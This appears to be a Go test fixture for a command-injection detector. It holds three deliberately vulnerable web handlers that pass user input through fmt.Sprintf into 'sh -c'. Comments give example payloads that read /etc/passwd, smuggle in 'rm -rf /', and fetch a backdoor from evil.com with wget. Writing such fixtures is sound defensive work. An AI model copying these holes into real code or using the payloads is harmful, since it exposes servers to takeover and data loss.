// Fixture: go-sh-c-sprintf — exec.Command("sh", "-c") with fmt.Sprintf
// Expected: TRUE POSITIVE (high confidence)
// CWE: CWE-78
// Agent: cmdi
// Pattern: User input interpolated via fmt.Sprintf into shell -c argument

package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
)

// VULNERABLE: fmt.Sprintf builds shell command string from user-controlled input
// Attacker sends: ?host=127.0.0.1;+cat+/etc/passwd
func pingHandler(w http.ResponseWriter, r *http.Request) {
	host := r.URL.Query().Get("host")
	cmd := fmt.Sprintf("ping -c 4 %s", host)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"output": string(out),
		"error":  fmt.Sprintf("%v", err),
	})
}

// VULNERABLE: user-controlled filename in tar command via shell
// Attacker sends: {"filename": "backup.sql\"; rm -rf / #"}
func backupHandler(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Filename string `json:"filename"`
		Path     string `json:"path"`
	}
	json.NewDecoder(r.Body).Decode(&req)

	cmd := fmt.Sprintf("tar -czf /backups/%s.tar.gz -C %s .", req.Filename, req.Path)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		http.Error(w, fmt.Sprintf("backup failed: %s\n%s", err, out), 500)
		return
	}
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// VULNERABLE: user-controlled arguments to curl via shell
// Attacker sends: ?url=http://example.com;+wget+http://evil.com/backdoor+-O+/tmp/bd
func proxyFetchHandler(w http.ResponseWriter, r *http.Request) {
	targetURL := r.URL.Query().Get("url")
	timeout := r.URL.Query().Get("timeout")
	if timeout == "" {
		timeout = "10"
	}
	cmd := fmt.Sprintf("curl -sS --max-time %s '%s'", timeout, targetURL)
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		http.Error(w, "fetch failed", 502)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(out)
}

func main() {
	http.HandleFunc("/api/ping", pingHandler)
	http.HandleFunc("/api/backup", backupHandler)
	http.HandleFunc("/api/fetch", proxyFetchHandler)
	http.ListenAndServe(":8080", nil)
}
